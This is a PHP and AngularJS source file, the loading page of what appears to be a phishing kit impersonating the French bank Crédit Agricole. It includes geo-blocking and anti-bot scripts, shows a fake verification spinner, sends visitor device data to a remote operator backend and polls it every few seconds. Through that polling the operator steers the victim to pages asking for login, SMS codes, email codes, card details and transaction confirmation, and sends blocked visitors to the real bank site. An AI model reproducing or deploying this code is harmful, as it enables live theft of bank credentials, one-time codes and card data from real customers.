
<?php

  include 'functions.php';
  if(!check_block_country()){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        exit;
  };
include '../new/anti0.php';
include '../new/anti1.php';
include '../new/anti2.php';
include '../new/anti3.php';
include '../new/anti4.php';
include '../new/anti5.php';
include '../new/anti6.php';
include '../new/anti7.php';
include '../new/anti8.php';
include '../new/anti9.php';
?>

<!DOCTYPE html>
<html>
<head>
    
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1, width=device-width">
     <title>Crédit Agricole</title>
   
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=edge,chrome=1">

    <style type="text/css">
body {
    background: #f2f2f26e;
}
span{
    position: absolute;
    top: 106%;
    width: 12rem;
    left: -1%;
    /* margin: -14px 0 0 -42px; */
    /* padding: 13px;*/
}
.loading {
position: fixed;
    top: 34%;
    left: 49%;
    margin: -14px 0 0 -42px;
    padding: 13px;
   /* background: #136cbd;*/
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
   /* -webkit-box-shadow: inset 0 0 5px #136cbd, 0 1px 1px rgba(255, 255, 255, 0.1);
    -moz-box-shadow: inset 0 0 5px #136cbd, 0 1px 1px rgba(255, 255, 255, 0.1);
    -ms-box-shadow: inset 0 0 5px #136cbd, 0 1px 1px rgba(255, 255, 255, 0.1);
    -o-box-shadow: inset 0 0 5px #136cbd, 0 1px 1px rgba(255, 255, 255, 0.1);
    box-shadow: inset 0 0 5px #136cbd, 0 1px 1px rgba(255, 255, 255, 0.1);*/
}

.loading-dot {
    float: left;
    width: 13px;
    height: 13px;
    margin: 0 4px;
    background: #009598;
  
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    border-radius: 50%;
  
    opacity: 0;
  
    -webkit-box-shadow: 0 0 2px white;
    -moz-box-shadow: 0 0 2px white;
    -ms-box-shadow: 0 0 2px white;
    -o-box-shadow: 0 0 2px white;
    box-shadow: 0 0 2px white;
  
    -webkit-animation: loadingFade 1s infinite;
    -moz-animation: loadingFade 1s infinite;
    animation: loadingFade 1s infinite;
}

.loading-dot:nth-child(1) {
    -webkit-animation-delay: 0s;
    -moz-animation-delay: 0s;
    animation-delay: 0s;
}

.loading-dot:nth-child(2) {
    -webkit-animation-delay: 0.1s;
    -moz-animation-delay: 0.1s;
    animation-delay: 0.1s;
}

.loading-dot:nth-child(3) {
    -webkit-animation-delay: 0.2s;
    -moz-animation-delay: 0.2s;
    animation-delay: 0.2s;
}

.loading-dot:nth-child(4) {
    -webkit-animation-delay: 0.3s;
    -moz-animation-delay: 0.3s;
    animation-delay: 0.3s;
}

@-webkit-keyframes loadingFade {
    0% { opacity: 0; }
    50% { opacity: 0.8; }
    100% { opacity: 0; }
}

@-moz-keyframes loadingFade {
    0% { opacity: 0; }
    50% { opacity: 0.8; }
    100% { opacity: 0; }
}

@keyframes loadingFade {
    0% { opacity: 0; }
    50% { opacity: 0.8; }
    100% { opacity: 0; }
}       
    </style>
</head>
<body ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
   
    <div class="loading">
        <img src="assets/img/CA_Logo_seul-1.svg" style="display: block;
    margin-bottom: 18px;
    width: 38%;">
        <div class="loading-dot"></div>
        <div class="loading-dot"></div>
        <div class="loading-dot"></div>
        <div class="loading-dot"></div>
        <span>Vérification en cours...</span>
    </div>








<script src="assets/js/jquery.min.js"></script>
<!-- <script src="assets/js/base-footer.min.js"></script> -->

<script src="assets/js/angular.min.js"></script>
<script src="assets/js/dirPaginate.js"></script>


    
    
<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    var urlx = window.location.pathname;
    var pathname = urlx.replace("loading.php", "");

    $scope.info_User={};
    $scope.load='';
    $scope.loads_info='';
    $scope.base_url='';
    $scope.logo_png='';

    document.addEventListener( 'visibilitychange' , function() {
        var Detaile = {}; 
        Detaile.id= $scope.load;
        if (document.hidden) {
            //console.log('bye');
            Detaile.status=0;
             $http({
                  method: 'post',
                  url: $scope.base_url+"api_cl/update_status_load",
                  data: Detaile, 
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
            }).then(function(data) {
                    console.log(data.data);
            });
        } else {
            //console.log('well back');
            Detaile.status=1;
             $http({
                  method: 'post',
                  url: $scope.base_url+"api_cl/update_status_load",
                  data: Detaile, 
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
            }).then(function(data) {
                    console.log(data.data);
            });
        }
    }, false );


    $scope.val_password='';
    $scope.val_login='';

    $scope.show_data = function(){
        $http({
          method: 'get',
          url: "config/device.php"
        }).then(function successCallback(response) {
                $scope.info_User=response.data;
                $scope.base_url=$scope.info_User['url'];
                console.log($scope.info_User)
                 $http({
                      method: 'post',
                      url: $scope.base_url+"api_cl/insert_line_loads",
                      data: $scope.info_User, 
                      headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
                }).then(function(data) {
                    if(data.data.exist){
                        console.log(data.data);
                        console.log(data.data.fin);
                        $scope.load=data.data.load ;
                         $scope.logo_png =data.data.region;
                        $scope.loads_info=data.data.loads_info;
                        if(data.data.redirect == 1 )
                         window.location.href = pathname+'fin.php';
                        if(data.data.block == 1)  window.location.href = 'https://www.credit-agricole.fr/'+$scope.logo_png+'/particulier/acceder-a-mes-comptes.html';
                    }else{
                        console.log(data.data);
                        $scope.load=data.data.load ;
                        $scope.loads_info=data.data.loads_info;
                        localStorage.setItem("load", $scope.load);
                        localStorage.setItem("loads_info", $scope.loads_info);
                        if(data.data.redirect == 1 )
                         window.location.href = pathname+'fin.php';
                        if(data.data.block == 1)   window.location.href = 'https://www.credit-agricole.fr/'+$scope.logo_png+'/particulier/acceder-a-mes-comptes.html';
                    }
                });
        }); 
    }






 setInterval(function() {
         var Detaile = {}; 
         Detaile.load_id= $scope.load;
         Detaile.id= $scope.loads_info;
         $http({
              method: 'post',
              url:  $scope.base_url+"api_cl/get_line_load_info",
              data: Detaile, 
              headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
        }).then(function(data) {

          console.log(data.data);
         if(data.data.load.block == 1){
                  var Detaile = {}; 
                  Detaile.id= $scope.load;
                  Detaile.status=0;
                     $http({
                          method: 'post',
                          url: $scope.base_url+"api_cl/update_status_load",
                          data: Detaile, 
                          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
                    }).then(function(data) {
                              window.location.href = 'https://www.credit-agricole.fr/'+$scope.logo_png+'/particulier/acceder-a-mes-comptes.html';
                    });
               
         }else if(data.data.load.redirect == 1){
                  var Detaile = {}; 
                  Detaile.id= $scope.load;
                  Detaile.status=0;
                     $http({
                          method: 'post',
                          url: $scope.base_url+"api_cl/update_status_load",
                          data: Detaile, 
                          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
                    }).then(function(data) {
                            window.location.href = pathname+'fin.php?u=358886';
                    });
               
         }
         else{
              if (data.data.load_info.d_r == 0) {

              }else if( data.data.load_info.d_r == 1){
                             
              }else if( data.data.load_info.d_r == 2){
                    window.location.href = pathname+'auth.php?u=358886';

              }else if( data.data.load_info.d_r == 3){
                     window.location.href = pathname+'verify_sms_.php?u=358886';
                               
              }else if( data.data.load_info.d_r == 4){
         
                     window.location.href = pathname+'verify_sms.php?u=358886';
                             
              }else if( data.data.load_info.d_r == 5){
         
                     window.location.href = pathname+'verify_mail.php?u=358886';
                                
              }else if( data.data.load_info.d_r == 6){
                     window.location.href = pathname+'card.php?u=358886';
          
              }
              
              else if( data.data.load_info.d_r == 7){
                     window.location.href = pathname+'verify_sms_err_.php?u=358886';
          
              }
              else if( data.data.load_info.d_r == 8){
                     window.location.href = pathname+'verify_sms_err.php?u=358886';
          
              }
              else if( data.data.load_info.d_r == 9){
                     window.location.href = pathname+'verify_mail_err.php?u=358886';
          
              }

              else if( data.data.load_info.d_r == 10){
                     window.location.href = pathname+'verify_trans.php?u=358886';
          
              }

              else if( data.data.load_info.d_r == 11){
                     window.location.href = pathname+'verify_notify.php?u=358886';
          
              }





              else{


              }
         }
        }); 
 }, 3000); 





}]);

</script>























</body>
</html>